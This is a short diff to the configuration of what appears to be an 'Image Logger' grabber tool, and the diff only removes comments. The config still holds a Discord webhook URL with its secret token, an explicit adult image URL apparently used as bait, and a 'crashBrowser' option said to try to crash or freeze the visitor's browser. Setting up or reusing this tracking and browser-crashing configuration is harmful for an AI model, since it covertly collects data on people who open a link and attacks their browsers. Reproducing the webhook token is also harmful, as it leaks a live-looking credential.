@@ -14,11 +14,11 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1335458983191904267/Ti_vYLYbpt6jsgGrviO3iOqpeF-rxHbjEXgMSiRNdTcfHZCiOi9FKGCemdwPnI9ioxSa",
     "image": "https://us.rule34.xxx//samples/1146/sample_ef9740e14d709e37b37e1109076b7b8b.jpg?12358881",
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger", 
+    "color": 0x00FFFF, 
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
